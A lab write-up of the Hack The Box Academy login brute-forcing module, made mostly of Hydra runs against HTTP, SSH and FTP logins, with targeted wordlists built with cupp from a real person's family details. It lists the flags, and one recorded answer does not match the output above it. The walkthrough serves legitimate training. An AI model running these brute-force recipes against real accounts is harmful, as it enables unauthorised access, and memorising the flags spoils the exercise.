# Login Brute Forcing
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Login Brute Forcing
* Tier: II
* Difficulty: Easy
* Category: Offensive
* Time estimate: 6 hours
* Date: 09-07-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Default Passwords
### Question:
![](./attachments/Pasted%20image%2020220709101847.png)

*Hints: Write separated by a colon, as: username:password*

The user credentials are easily guessable as it is `admin:admin`. 

Brute forcing method:
```
┌──(kali㉿kali)-[~]
└─$ hydra -F -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 46.101.47.107 -s 31657 http-get /
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 05:08:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22236 login tries (l:17/p:1308), ~1390 tries per task
[DATA] attacking http-get://46.101.47.107:31657/
[31657][http-get] host: 46.101.47.107   login: admin   password: admin
[STATUS] attack finished for 46.101.47.107 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 05:08:30
```

**Answer:** `admin:admin`

---
## Login Brute Forcing
### Question:
![](./attachments/Pasted%20image%2020220709101929.png)

*Hint: Use the same answer as the previous question!*

```
┌──(kali㉿kali)-[~]
└─$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p amormio -u -f 46.101.47.107 -s 31657 http-get /login.php                                                
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 05:24:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
[DATA] attacking http-get://46.101.47.107:31657/login.php
[31657][http-get] host: 46.101.47.107   login: aartjan   password: amormio
[STATUS] attack finished for 46.101.47.107 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 05:24:21
```

**Answer:** `admin:admin` 	

---
## Login Brute Forcing
### Question:
![](./attachments/Pasted%20image%2020220709102007.png)

```
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -f 134.209.17.29 -s 31027 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 05:57:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 59185 login tries (l:1/p:59185), ~3700 tries per task
[DATA] attacking http-post-form://134.209.17.29:31027/login.php:username=^USER^&password=^PASS^:F=<form name='login'
[31027][http-post-form] host: 134.209.17.29   login: admin   password: password1
[STATUS] attack finished for 134.209.17.29 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 05:57:08
```

The page after successful login.

![](./attachments/Pasted%20image%2020220709115935.png)

**Answer:** `HTB{bru73_f0rc1n6_15_4_l457_r350r7}`

---
## Service Authentication Brute Forcing
### Question 1:
![](./attachments/Pasted%20image%2020220709102037.png)

Personalized username list:

```
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/urbanadventurer/username-anarchy.git
Cloning into 'username-anarchy'...
remote: Enumerating objects: 386, done.
remote: Total 386 (delta 0), reused 0 (delta 0), pack-reused 386
Receiving objects: 100% (386/386), 16.76 MiB | 4.18 MiB/s, done.
Resolving deltas: 100% (127/127), done.

┌──(kali㉿kali)-[~]
└─$ cd username-anarchy                                                        

┌──(kali㉿kali)-[~/username-anarchy]
└─$ sudo ./username-anarchy Bill Gates > bill.txt

┌──(kali㉿kali)-[~/username-anarchy]
└─$ ls
bill.txt
```

Personalized password list:

```
┌──(kali㉿kali)-[~/username-anarchy]
└─$ cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955


> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964


> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996


> Pet's name: Nila
> Company name: Microsoft


> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
[+] Now load your pistolero with william.txt and shoot! Good luck!

┌──(kali㉿kali)-[~/username-anarchy]
└─$ sed -ri '/^.{,7}$/d' william.txt
                      
┌──(kali㉿kali)-[~/username-anarchy]
└─$ sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt

┌──(kali㉿kali)-[~/username-anarchy]
└─$ sed -ri '/[0-9]+/!d' william.txt

┌──(kali㉿kali)-[~/username-anarchy]
└─$ ls
bill.txt  william.txt
```

Brute force:

```
┌──(kali㉿kali)-[~/username-anarchy]
└─$ hydra -l b.gates -P william.txt -u -f ssh://157.245.33.77:32626 -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 06:37:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 13093 login tries (l:1/p:13093), ~3274 tries per task
[DATA] attacking ssh://157.245.33.77:32626/
[32626][ssh] host: 157.245.33.77   login: b.gates   password: 4dn1l3M!$
[STATUS] attack finished for 157.245.33.77 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 06:38:14
```

Login:

```
┌──(kali㉿kali)-[~/username-anarchy]
└─$ ssh b.gates@157.245.33.77 -p 32626
The authenticity of host '[157.245.33.77]:32626 ([157.245.33.77]:32626)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[157.245.33.77]:32626' (ED25519) to the list of known hosts.
b.gates@157.245.33.77's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

(...)

b.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ pwd
/home/b.gates
b.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ ls
flag.txt  rockyou-10.txt
b.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ cat flag.txt 
HTB{n3v3r_u53_c0mm0n_p455w0rd5!}
```

**Answer:** `HTB{n3v3r_u53_c0mm0n_p455w0rd5!}`

### Question 2:
![](./attachments/Pasted%20image%2020220709102056.png)

```
b.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 11:49:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[21][ftp] host: 127.0.0.1   login: m.gates   password: computer
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 11:49:52

b.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ su m.gates
Password: 
m.gates@bruteforcing-2-476470-865f7b6f77-db86m:/home/b.gates$ cd ../m.gates
m.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ ls
flag.txt
m.gates@bruteforcing-2-476470-865f7b6f77-db86m:~$ cat flag.txt
HTB{1_4m_@_bru73_f0rc1n6_m4573r}
```

**Answer:** `HTB{1_4m_@_bru73_f0rc1n6_m4573r}`

---
## Skills Assessment - Website
### Question 1:
![](./attachments/Pasted%20image%2020220709102141.png)

```
┌──(kali㉿kali)-[~/username-anarchy]
└─$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -u 46.101.60.47 -s 31524 http-get /
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 07:04:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1006145 login tries (l:17/p:59185), ~62885 tries per task
[DATA] attacking http-get://46.101.60.47:31524/
[31524][http-get] host: 46.101.60.47   login: user   password: password
```

![](./attachments/Pasted%20image%2020220709130703.png)

**Answer:** `HTB{4lw4y5_ch4n63_d3f4ul7_p455w0rd5}`

### Question 2:
![](./attachments/Pasted%20image%2020220709102208.png)

*Hint: You may reuse the username you found earlier. Make sure you got the correct fail string and parameters.*

```
┌──(kali㉿kali)-[~/username-anarchy]
└─$ hydra -l user -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -f 46.101.60.47 -s 31524 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"             
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 07:27:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 59185 login tries (l:1/p:59185), ~3700 tries per task
[DATA] attacking http-post-form://46.101.60.47:31524/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'
[31524][http-post-form] host: 46.101.60.47   login: user   password: harrypotter
[STATUS] attack finished for 46.101.60.47 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 07:27:23
```

user:pass `user:harrypotter`

![](./attachments/Pasted%20image%2020220709132928.png)

**Answer:** `HTB{c0mm0n_p455w0rd5_w1ll_4lw4y5_b3_h4ck3d!}`

---
## Skills Assessment - Service Login
### Question 1:
![](./attachments/Pasted%20image%2020220709102314.png)

*Hint: To reduce the length of the wordlist, don't input too much information about the victim. Start with only their first name, and if you don't get a hit, then start adding information gradually to build bigger wordlists.*

```
┌──(kali㉿kali)-[~/username-anarchy]
└─$ cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Harry
> Surname: Potter
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: n  
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: n

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to harry.txt, counting 2870 words.
[+] Now load your pistolero with harry.txt and shoot! Good luck!

┌──(kali㉿kali)-[~/username-anarchy]
└─$ sed -ri '/[0-9]+/!d' harry.txt                             

┌──(kali㉿kali)-[~/username-anarchy]
└─$ sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt

┌──(kali㉿kali)-[~/username-anarchy]
└─$ sed -ri '/^.{,7}$/d' harry.txt                             

┌──(kali㉿kali)-[~/username-anarchy]
└─$ wc harry.txt                                                          
 77  78 883 harry.txt
 
┌──(kali㉿kali)-[~/username-anarchy]
└─$ hydra -L potter.txt -P harry.txt -u -f ssh://206.189.25.173:32229 -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 09:08:22
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 33690 login tries (l:15/p:2246), ~8423 tries per task
[DATA] attacking ssh://206.189.25.173:32229/
[32229][ssh] host: 206.189.25.173   login: harry.potter   password: H4rry!!!
[STATUS] attack finished for 206.189.25.173 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 09:08:33

┌──(kali㉿kali)-[~/username-anarchy]
└─$ ssh harry.potter@206.189.25.173 -p 32229
harry.potter@206.189.25.173's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

(...)

harry.potter@bruteforcingasmt-2-476470-84778bc67b-7xfzj:~$ cat flag.txt
HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}
```

**Answer:** `HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}`

### Question 2:
![](./attachments/Pasted%20image%2020220709102406.png)

*Hint: Use the wordlist provided in your home directory.*

```
harry.potter@bruteforcingasmt-2-476470-84778bc67b-7xfzj:~$ ls /home
g.potter  harry.potter
harry.potter@bruteforcingasmt-2-476470-84778bc67b-7xfzj:~$ netstat -antp | grep -i list
(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -

harry.potter@bruteforcingasmt-2-476470-84778bc67b-7xfzj:~$ hydra -l g.potter -P rockyou-30.txt ftp://127.0.0.1
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-09 14:18:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1556 login tries (l:1/p:1556), ~98 tries per task
[DATA] attacking ftp://127.0.0.1:21/
[STATUS] 304.00 tries/min, 304 tries in 00:01h, 1252 to do in 00:05h, 16 active
[STATUS] 300.00 tries/min, 900 tries in 00:03h, 656 to do in 00:03h, 16 active
[STATUS] 293.50 tries/min, 1174 tries in 00:04h, 382 to do in 00:02h, 16 active
[21][ftp] host: 127.0.0.1   login: g.potter   password: harry
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-09 14:23:03
harry.potter@bruteforcingasmt-2-476470-84778bc67b-7xfzj:~$ su g.potter
Password: 
g.potter@bruteforcingasmt-2-476470-84778bc67b-7xfzj:/home/harry.potter$ cat ../g.potter/flag.txt
HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}
```

**Answer:** `HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}`

---
**Tags:** [[Hack The Box Academy]]